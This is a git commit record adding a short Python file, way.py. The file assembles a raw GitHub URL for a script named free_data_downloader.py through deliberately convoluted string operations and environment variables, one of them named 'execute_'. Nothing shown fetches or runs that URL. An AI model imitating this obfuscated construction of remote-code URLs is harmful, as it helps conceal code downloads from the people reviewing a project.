3911b69a73757b3168cbc75704b2d674ded2ee1b
JAIME ANDRES POLANCO JIMENEZ <49122673+JAPJ182@users.noreply.github.com>
2022-09-20 17:47:34 -0500

    Create way.py

---
+++ way.py
@@ -0,0 +1,7 @@
+import os
+url = '/funciones'
+url = url.split('funciones')[0] + 'funciones/gcpdefunctions'
+url = url.replace('funciones','') + '/main/other_function/'
+os.environ['location'] = 'https://raw.githubusercontent.com/'
+os.environ['execute_'] =  'JAPJ182/free_data_downloader.py'
+path = os.environ['location']+os.environ['execute_'].split('/')[0]    +url.replace('//','/')+os.environ['execute_'].split('/')[1]   
